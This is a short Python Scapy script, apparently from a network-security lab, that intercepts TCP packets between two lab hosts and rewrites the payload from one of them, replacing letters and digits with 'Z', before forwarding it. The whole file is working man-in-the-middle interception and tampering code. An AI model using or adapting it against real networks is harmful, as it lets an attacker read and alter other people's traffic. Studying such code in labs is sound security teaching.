from scapy.all import *
print("Lauching MITM attack\n")

# IP and MAC addresses for Host A and Host B
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.105"  # Host M's IP address

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one
        newpkt = IP(bytes(pkt[IP]))  # Copy the IP layer
        del(newpkt.chksum)  # Delete the checksum so it gets recalculated
        del(newpkt[TCP].chksum)  # Delete the checksum in the TCP header

        # If the original packet has a TCP payload, modify it
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # Extract the original payload
            print("Original data:", data.decode(), "len:", len(data))
            # Replace all letters and numbers with Zs
            newdata = re.sub(r'[0-9a-zA-Z]', 'Z', data.decode()) 
            print("Modified data:", newdata, "len:", len(newdata))

            # Send the new packet with the modified payload
            send(newpkt/newdata)
        else:
            send(newpkt)

    # For packets from B to A, we do not modify them
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))  
        del(newpkt.chksum)  
        del(newpkt[TCP].chksum) 
        send(newpkt)

# Start sniffing with a filter to exclude own packets (based on IP_M)
f = f"tcp and not src host {IP_M}"
pkt = sniff(iface='eth0',filter=f, prn=spoof_pkt)
